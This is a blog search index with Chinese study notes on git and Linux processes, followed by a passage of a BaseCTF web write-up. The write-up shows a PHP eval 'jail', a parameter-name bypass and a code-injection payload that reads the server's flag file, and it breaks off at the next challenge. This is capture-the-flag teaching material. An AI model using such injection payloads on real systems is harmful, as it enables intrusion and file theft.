<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%9C%89%E5%85%B3git/"/>
    <url>/2024/09/23/%E6%9C%89%E5%85%B3git/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/Pasted%20image%2020240701100152.png"><br>创建仓库<code>git init</code><br>配置邮箱姓名</p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>比如现在创建两个文件a.txt b.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">touch</span> a.txt<br><span class="hljs-built_in">touch</span> b.txt<br>git status<span class="hljs-comment">#查看git状态</span><br>git add a.txt<br>git status<br>git commit -m <span class="hljs-string">&quot;commit1&quot;</span><br>git <span class="hljs-built_in">log</span><br><span class="hljs-comment">#对a.txt进行一些修改</span><br>git status<br>git add a.txt<span class="hljs-comment">#修改保存</span><br>git commit -m <span class="hljs-string">&quot;commit2&quot;</span><br>git add b.txt<br>git commit --amend<span class="hljs-comment">#会将修改合并到最近的commit中</span><br>git branch<span class="hljs-comment">#查看分支</span><br>git branch a<span class="hljs-comment">#新建分支</span><br>git checkout a<span class="hljs-comment">#切换分支</span><br></code></pre></td></tr></table></figure><p>在 Git 中，是用 HEAD 来表示当前版本的，也就是最新的一次提交，同时，它也可以记录之前的版本，<br>HEAD~ 就是代表当前版本的上一版本<br>HEAD<del>2，则是代表当前版本的上上一个版本。<br>所以，如果我们需要回到上一个提交的版本，那么我们就可以使用这个命令<br>&#96;git reset –hard HEAD</del>&#96;<br><img src="/images/Pasted%20image%2020240701105434.png"></p><h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><p><img src="/images/Pasted%20image%2020240701103404.png"><br><img src="/images/Pasted%20image%2020240701104207.png"></p><h4 id="查看创建删除分支"><a href="#查看创建删除分支" class="headerlink" title="查看创建删除分支"></a>查看创建删除分支</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">git branch<br>git checkout &lt;branch_name&gt;#切换分支<br>git checkout -b &lt;branch_name(new)&gt; #从当前分支创建一个新的分支<br>git branch -d &lt;branch_name&gt;#删除分支<br></code></pre></td></tr></table></figure><h4 id="分支合并"><a href="#分支合并" class="headerlink" title="分支合并"></a>分支合并</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">git merge &lt;branch_name&gt;#将另一个分支合并到当前所在的分支<br></code></pre></td></tr></table></figure><p>只执行 git merge 时，如果可以 fast-forward，则默认fast-forward ，否则进行 non fast-forward merge<br>在 non-fast-forward 合并过程中，会尝试合并修改，如果发生不能自动合并的冲突，则需要手动解决冲突</p><p>比如这个合并由于input.txt文件不一致, 所以要<code>vim input.txt</code>进行编辑<br><img src="/images/Pasted%20image%2020240702143001.png"></p><h3 id="有关checkout"><a href="#有关checkout" class="headerlink" title="有关checkout"></a>有关checkout</h3><p>有两种用法，第一种是切换分支，第二种是撤销修改。<br><a href="https://blog.csdn.net/raoxiaoya/article/details/111321583">git深入理解(六)：git checkout详解</a></p><h3 id="远端交互"><a href="#远端交互" class="headerlink" title="远端交互"></a>远端交互</h3><p><img src="/images/Pasted%20image%2020240702091532.png"><br><code>git clone</code></p><ul><li>克隆操作通常只在你第一次获取项目代码时使用。</li><li>语法：<code>git clone [url]</code>，其中<code>[url]</code>是远程仓库的地址。<br><code>git pull</code></li><li>拉取操作通常用于在已经存在的本地仓库中更新代码，以确保本地代码与远程仓库同步。</li><li>语法：<code>git pull [remote] [branch]</code>，其中<code>[remote]</code>通常是<code>origin</code>，<code>[branch]</code>是你想要拉取的远程分支名称。<br><code>git pull</code> 是一个组合命令，实际上是<code>git fetch</code>（从远程仓库获取所有分支的更新）后跟<code>git merge</code>(将远程分支的更新合并到当前分支)</li></ul><h3 id="gitignore"><a href="#gitignore" class="headerlink" title=".gitignore"></a><code>.gitignore</code></h3><p>系统生成的文件、编译产生的中间文件和结果文件<br>密码、私钥等敏感信息文件<br>其他特殊原因不希望被版本管理的文件</p><p>创建<code>.gitignore</code>程序, 将其添加到版本库中</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%9C%89%E5%85%B3Linux%E5%AD%90%E8%BF%9B%E7%A8%8B/"/>
    <url>/2024/09/23/%E6%9C%89%E5%85%B3Linux%E5%AD%90%E8%BF%9B%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="进程-地址空间-线程"><a href="#进程-地址空间-线程" class="headerlink" title="进程,地址空间,线程"></a>进程,地址空间,线程</h2><p>由于计算机所拥有的物理资源有限，当多个程序在计算机上同时运行时，它们不可能连续地在处理器上运行或占用全部内存，因此我们需要进程的抽象在用户的一侧隐藏上下文切换等细节。</p><ul><li>进程作为运行的程序的抽象，包含了一个程序的运行状态和这个程序所用的抽象内存及其中存储的数据。</li><li>我们将一个进程可以使用的全部内存的地址和它们存储的数据，称为这个进程的 <strong>地址空间（address space）</strong></li><li>进程可以看作是一个或多个线程与一个地址空间的结合</li></ul><p>上面提到的都是进程在用户一侧的抽象，但我们还没有考虑过在系统一侧我们需要什么数据结构来实现这一抽象。这一节中我们就将会探索进程在系统中的实现。</p><p>在讲解进程在系统中的实现方式以前，让我们先明确这一实现方式需要达到的目的：</p><ul><li>一方面，进程的结构必须能够囊括一个进程的运行状态，在由于中断、异常或系统调度进入内核态时我们应该能够将进程的运行状态放入内存中的某一位置，使我们可以在某一个时间点根据进程的优先级接着这次的进度再次运行该进程；</li><li>另一方面，由于进程在用户一侧对内存进行了抽象，我们需要在系统一侧包含从抽象内存向实际内存和外存（磁盘等存储设备）的映射，以便通过抽象内存的地址获得物理地址和其中存储的数据。</li></ul><p>为了实现上述的第一个目的，即在进程中存储其运行状态，我们将在进程中存储处理器状态寄存器、指令计数器、栈指针、通用寄存器等代表了进程目前的运行状态的值。由于现代计算机中往往有多个核或多个处理器，我们的程序可以达到 <strong>并行（parallelism，即在物理时间上同时运行，区别于多个进程在处理器上的并发（concurrency））</strong>，因此同一个进程可能同时包含有多个不同的运行状态。为了更好地区分进程在一个处理器上的运行状态和进程本身的运行状态，我们在此引入 <strong>线程（thread）</strong> 的概念。每个线程拥有一个 <strong>线程控制块（thread control block, TCB）</strong>，用来存储我们上述提到的处理器状态寄存器、指令计数器、栈指针、通用寄存器等数值，但同一个进程中的所有线程都共享同一个地址空间。<br><img src="/images/d623ba5f1e352fe303ada7d6e4554aa74cc59e8f.png"></p><p>前文我们已经提到，一个用户进程所看到的内存空间是抽象的，区别于实际的物理内存，因此为了支持进程从抽象内存获取物理内存中存储的信息，我们需要在进程中包含从抽象内存向物理内存的映射，即该系统所用的地址转换方法所需要的信息。地址转换有很多种不同方法，包括分页存储、分段存储等，它们都需要不同的信息来实现地址转换；我们将在下一章中详细介绍这些方法，这里我们将以最为简单的 Base and Bound 作为例子来解释这一概念。</p><p>在 Base and Bound 方法中，系统将一段连续的物理内存分配给一个进程，Base 代表基地址，即系统分配给一个进程的可用内存的起始地址，Bound 代表这个进程可用的内存的最高地址。为了读写物理内存，我们将基地址与抽象内存地址相加，获得实际地址；只要实际地址不大于 Bound，内核就会允许进程进行该操作。因此在这个方法中，为了实现进程地址空间的抽象，进程在系统一侧的数据结构中必须包括这段可用的内存的基地址、可用长度。</p><p>为了能在一个进程开始运行的时候方便地载入上面提到的两方面的数据，我们需要一个数据结构来包含这些数据。这个数据结构就是 <strong>进程控制块（Process Control Block, PCB）</strong>。对于内核来说，它是进程存在的唯一标识。</p><p>PCB中存储的信息除了上面提到的实现地址转换的信息和表示运行状态的线程信息以外，还包括了很多系统在调度进程时需要的信息，比如:</p><ul><li>进程号</li><li>进程所处状态（我们将在下一节中更多地解释进程可能所处的状态与不同状态间的切换</li><li>进程的优先级等等。<br>需要注意的是，我们不会将整个地址空间中包含的地址及其数据都存储在进程控制块里；我们只需要可以帮助我们从抽象内存地址获得实际物理地址的方法，而实际数据仍然存储在内存的对应位置中。</li></ul><p>由于进程控制块中的信息包含了优先级、基地址、可用地址范围等用户进程不应该有权限修改的信息，用户进程不应该有权限修改进程控制块。因此我们将进程控制块存储在<strong>内核空间</strong>中。</p><h2 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h2><p>显然，进程至少需要两个状态——<strong>运行态（running）</strong> 与 <strong>就绪态（ready）</strong>。进程在运行态中运行一段时间后被切换出去，排入就绪队列，等待继续运行。在三态模型中，进程还有一个状态，即 <strong>等待态（wait）</strong>。在这个状态中，进程在等待某一事件完成，不会被排入就绪队列，直到该事件发生后，进程才会被排入就绪队列，可能被选为下一个运行的进程。这一等待事件可能包括等待系统调用完成，等待获得某一个锁或收到某一信号量的信号等等</p><p>处于就绪态的进程不会因为遇到任何事件而无法进入等待态；处于等待态进程在事件发生后考虑到优先级等问题，必须先回到就绪状态而不能直接运行。</p><p>除三态模型外，五态模型也是一种常见的进程状态转换模型。相比三态模型，五态模型多引入了 <strong>新建态（new）</strong> 和 <strong>终止态（exit）</strong>。</p><ul><li>新建态对应着进程被创建时尚未加入就绪队列的状态。为了建立一个新的进程，内核需要给进程分配资源（如：建立进程控制块）、建立必要的管理信息；在这个过程中，进程就处于新建态。</li><li>终止态对应的是<strong>进程已经结束但尚未被系统撤销的状态</strong>。处于终止态的进程虽然已经结束，但其获得的资源还未被系统回收，因此系统仍然可以获得该进程结束时的信息。</li></ul><p>定义这两种状态可以帮助我们避免一些我们不想看到的情况。比如，如果我们允许一个进程在获得全部资源以前就进入就绪队列，那么一个新进程可能在未获得全部资源前就开始运行，而产生错误。<br>同样的，如果一个进程 A 创建了另一个进程 B 而想要等待进程 B 运行完毕，从中获得一些信息，那么终止态的缺失可能导致进程 B 率先运行完毕后被系统撤销，使得进程 A 无法从进程 B 处获得任何信息。</p><p>UNIX 系统中，如果发生一个进程创建另一个进程的情况，那么在老进程从新进程获取信息前，新进程会一直停留在终止态；如果新进程终止后，仍在运行的老进程没有从新进程获取信息，那么新进程就会成为我们所说的“僵尸进程”，停留在系统内存中，导致系统变慢。<br><img src="/images/b49f9d2d90d601cb3ff832695ce1727592adba5b.png"></p><h2 id="子进程和父进程"><a href="#子进程和父进程" class="headerlink" title="子进程和父进程"></a>子进程和父进程</h2><h3 id="fork-exit"><a href="#fork-exit" class="headerlink" title="fork() exit()"></a>fork() exit()</h3><p>一个进程可以通过系统调用<code>fork()</code>创建另一个进程, 并等待其运行完毕<br><code>pid_t fork(void)</code><br><code>fork()</code>被包含在 <code>unistd.h</code> 中。这个函数不需要任何参数, 它会直接创建一个新的进程, 将现运行的进程的处理器状态、地址空间直接拷贝到新进程中，因此新进程也会从 fork() 对应的指令开始运行。我们称这个新进程为调用 fork()的进程的子进程，称创建子进程的进程为父进程。</p><p><code>fork()</code>执行完毕后会返回一个进程标识 ID (<code>pid = process ID</code>)，可以被用来区分父进程与子进程。在父进程中返回的进程标识 ID 是新创建的子进程的进程标识 ID，而在子进程中返回的进程标识ID为 0。我们可以利用 if 语句判断进程标识 D 是否为 0，从而使子进程与父进程执行不同的命令</p><p>相当于把子进程和父进程运行的代码实际上是一样的, 但是由于进程标识不一样, 所以我们人为的让他们执行不同的指令</p><p>一个进程在运行结束或产生重大错误(如:企图越权使用内核的特权指令)后会被系统终止。但我们在由 <code>fork()</code> 产生的子程序中也可以用 <code>exit()</code>系统调用主动结束这个程序。<br><code>void exit(int status)</code></p><p><code>exit()</code>函数在<code>stdlib.h</code>头文件中; 它的参数 <code>status</code> 表示这个进程退出时的结束状态。当我们用这个函数结束一个子进程时, <code>status</code> 会作为子进程的结束状态被提供给 wait()的第一个参数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello World\n&quot;</span>);<br>    <span class="hljs-type">int</span> pid = fork();<span class="hljs-comment">//创建一个子进程</span><br>    <span class="hljs-keyword">if</span>(pid != <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//在父进程中返回的进程标识 ID 是新创建的子进程的进程标识 ID，而在子进程中返回的进程标识ID为0</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Father progress&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> second_pid = fork();<span class="hljs-comment">//子进程又创建了一个子进程</span><br>        <span class="hljs-keyword">if</span>(second_pid != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;son&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;grandson&quot;</span>);<span class="hljs-comment">//子进程的子进程</span><br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="wait"><a href="#wait" class="headerlink" title="wait()"></a>wait()</h3><p><code>pid_t wait(int* stat_loc)</code></p><p><code>wait()</code> 被包含在 <code>sys/wait.h</code> 中。它的参数 <code>stat_loc</code> ，是一个可以被用来储存等待的进程的结束状态值 (<code>exit code</code>, <strong>一个代表子进程是否成功退出的整数 (成功则为0，否则为对应的错误数字) 的指针</strong>)</p><p>但我们也可以把这个设为<code>NULL</code>不接受这个参数, 表示我们不关心子进程的<code>exit code</code>,  函数也可以运行</p><p>wait()函数会使父进程的状态变为等待态, 直到父进程的所有子进程中的<strong>一个</strong>成功退出并返回结束状态值, 父进程才可以进入就绪状态, 准备继续运行</p><p>如果在 wait()被调用时已经有可用的结束状态值，那么 wait()会立即返回 <strong>返回结束状态值的子进程的</strong> 进程标识 ID<br>如果在等待过程中出现了错误(如已经没有可等待的子进程)，那么<code>wait()</code>将返回 -1</p><ul><li>注意: 父进程直接不能等待子进程的子进程</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello World！\n&quot;</span>);<br>    <span class="hljs-type">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(pid != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">int</span> status;<br>        <span class="hljs-type">int</span> result = <span class="hljs-built_in">wait</span>(&amp;status);<span class="hljs-comment">//status存储子进程的结束状态值exit code</span><br>        <span class="hljs-comment">//返回的值result是返回结束状态值的子进程的进程标识ID</span><br>        <span class="hljs-comment">//如果出现错误或者没有可以等待的子进程, 那么返回-1</span><br>        <span class="hljs-keyword">if</span>(result == <span class="hljs-number">-1</span> || status != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;failed&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Father progress&quot;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> second_pid = fork();<br>        <span class="hljs-keyword">if</span>(second_pid != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">int</span> new_status;<br>            <span class="hljs-type">int</span> new_result = <span class="hljs-built_in">wait</span>(&amp;new_status);<br>            <span class="hljs-keyword">if</span>(new_result == <span class="hljs-number">-1</span> || new_status != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;son&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;grandson&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>多进程编程在网络编程中的作用是, 每当服务器收到请求, 就会fork()出一个进程来处理请求. 父进程依然等待其他请求的到来</li></ul><h3 id="waitpid"><a href="#waitpid" class="headerlink" title="waitpid()"></a>waitpid()</h3><p>在本节的最后我们想讲一讲<code>wait</code>的一个变体，<code>waitpid()</code><br><code>pid_t waitpid(pid_t pid, int* stat_loc, int options);</code></p><p><code>waitpid()</code>与<code>wait()</code>不同的一点在于你可以通过在<code>pid</code>参数里指定一个进程标识 ID 来等待一个有特定的进程标识 ID 的进程—— 当<code>pid</code>为一个大于零的数的时候<code>waitpid</code>等待的就是进程标识 ID 等于<code>pid</code>的子进程； 当<code>pid</code>为 −1−1 时，我们等待所有子进程中的任何一个；当<code>pid</code>为 00 时，我们等待所有进程组标识 ID 与父进程相同的子进程；当<code>pid</code>小于 −1−1 时，我们任何进程组标识 ID 为 <code>pid</code> 的绝对值的进程。<br><code>stat_loc</code>与<code>wait()</code>中的<code>stat_loc</code>有同样的作用；<code>options</code>将一些针对这个函数的特殊的控制选项（如：我们可以选择在没有子进程退出时立即返回，而不做等待）用或运算连接在一起，我们在这里不对所有选项一一进行介绍，如果你有兴趣了解可以在 <a href="http://linux.die.net/man/3/wait">Linux man page</a> 或 <a href="http://baike.baidu.com/link?url=BlqWV9VcH7kgOW0vOPrxDkfuOdeN2-aG8RQWqw7l_DsFfdHsePh8tNOgMJRbIUrhKCBlxZluUS3x5InAjVvCb_">百度百科</a> 上查看。当 <code>options</code> 被设为 00 时，<code>waitpid</code> 没有任何特殊选项。因此，我们可以知道，当<code>pid</code>为 −1−1、<code>options</code>为 00 时，<code>waitpid()</code>与<code>wait()</code>效果相同</p><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><p>上一节中我们已经提到，利用<code>fork()</code>返回的进程标识 ID，我们可以在子进程中执行和父进程中不同的指令；但如果我们想要运行完全不同的程序，这种办法可能就不是最好的。因此我们在此向你介绍一个新的系统调用，<code>execve()</code><br><code>int execve(const char* filename, char* const argv[], char* const envp[]);</code></p><p>这个函数将在 <strong>现在运行的</strong> 进程中以<code>argv</code>中存储的字符串为参数运行由<code>filename</code>指向的可执行程序，并将<code>envp</code>中存储的“变量&#x3D;数值”对作为环境变量代入这个程序。根据传统，<code>argv</code>中的第一个参数必须与<code>filename</code>一致，真正的参数从第二个开始</p><p><code>execve</code>会以<code>filename</code>的程序覆盖现在进程中正在运行的程序，<strong>因此所有在<code>execve</code>函数之后的行都只会在<code>execve</code>失败之后被执行</strong></p><p>我们可以通过在后面加入打印语句等方法标识<code>execve</code>运行失败。</p><p>基于<code>execve()</code>的还有六个函数；他们都具有在现有的进程中打开某一可执行文件、覆盖现有程序执行的功能。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">execl</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* arg, ...)</span></span>; <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">execlp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* file, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* arg, ...)</span></span>; <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">execle</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* arg, ..., <span class="hljs-type">char</span>* <span class="hljs-type">const</span> envp[])</span></span>; <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">execv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">char</span>* <span class="hljs-type">const</span> argv[])</span></span>; <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">execvp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* file, <span class="hljs-type">char</span>* <span class="hljs-type">const</span> argv[])</span></span>; <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">execvpe</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* file, <span class="hljs-type">char</span>* <span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span>* <span class="hljs-type">const</span> envp[])</span></span>;<br></code></pre></td></tr></table></figure><p>我们可以将这些函数表示为：“exec + l&#x2F;v + p&#x2F;e&#x2F;pe”，所以这六个函数主要有两处不同。<br>第一处不同（l&#x2F;v）在参数中表现为“execl_”类函数将所有参数作为一整个字符串代入，而“execv_”类函数将参数分别放入一个字符串的数组中，将数组作为参数代入函数运行<br>第二处不同（p&#x2F;e&#x2F;pe）表现为包含 p（代表 path）的函数可以模仿计算机中壳的功能，在“file”中不含“&#x2F;”时应用环境变量 PATH 中的目录来寻找可执行文件，而包含 e（代表 environment）的函数可以像<code>execve</code>一样将“变量&#x3D;数值”对作为环境变量代入程序。</p><p>所有上述函数的常见用法是先由当前运行的进程调用<code>fork()</code>产生新进程，然后在新进程中用<code>exec()</code>类函数运行新程序。</p><p>你可能会认为这样应用<code>fork()</code>复制了全部父进程的地址空间后又马上弃置不用、浪费了很多处理器时间，但实际上 Linux 系统采用了<code> copy_on_write</code> 技术，也就是说只有在某一个数据被修改时那个数据才会被实际复制到子进程的地址空间，所以当<code>fork()</code>之后直接运行<code>exec()</code>时，父进程的地址空间不会被复制过来。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/BaseCTF-web/"/>
    <url>/2024/09/23/BaseCTF-web/</url>
    
    <content type="html"><![CDATA[<h3 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h3><p><img src="/images/Pasted%20image%2020240916002843.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;hint.html&quot;</span>);  <br><span class="hljs-variable">$Jail </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Jail_by.Happy&#x27;</span>];  <br>  <br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$Jail </span>== <span class="hljs-literal">null</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Do You Like My Jail?&quot;</span>);  <br>  <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Like_Jail</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;  <br>    <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(`|\$|a|c|s|require|include)/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <br>&#125;  <br>  <br><span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">Like_Jail</span>(<span class="hljs-variable">$Jail</span>)) &#123;  <br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$Jail</span>);  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Yes! you escaped from the jail! LOL!&quot;</span>;  <br>&#125; <span class="hljs-keyword">else</span> &#123;  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You will Jail in your life!&quot;</span>;  <br>&#125;  <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;  <br>  <br><span class="hljs-comment">// 在HTML解析后再输出PHP源代码  </span><br>  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先是如何正确的发送<code>Jail_by.Happy</code>这个参数, 我们不能直接<code>?Jail_by.Happy=xxx</code><br>因为当 php 版本⼩于 8 时，GET 请求的参数名含有 <code>.</code> ，会被转为 <code>_</code><br>但是如果参数名中有 <code>[</code> ，这个 <code>[</code> 会被直接转为 <code>_</code> ，而且后⾯如果有 <code>.</code> ，这个 <code>.</code> 就不会被转为 <code>_</code><br>所以可以通过<code>http://challenge.basectf.fun:41914/?Jail[by.Happy=xxxxxx</code>这种方式绕过</p><p>现在考虑如何得到 flag，<br>文件中包含了<code>hint.html</code>, 访问这个<br><img src="/images/Pasted%20image%2020240916003412.png"><br>下面这一串经过base64解密, 可以看到一个文件<br>访问<code>http://challenge.basectf.fun:41914/ph0_info_Like_jail.php</code><br>访问后在phpinfo中看见过滤了很多内容，但是 highlight_file 函数可以完美绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?Jail[by.Happy=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;/f*&quot;</span>)[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure><p><img src="/images/Pasted%20image%2020240916003718.png"></p><h3 id="baseCTF-only-one-sql"><a href="#baseCTF-only-one-sql" class="headerlink" title="baseCTF-only one sql"></a>baseCTF-only one sql</h3><p>白盒源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 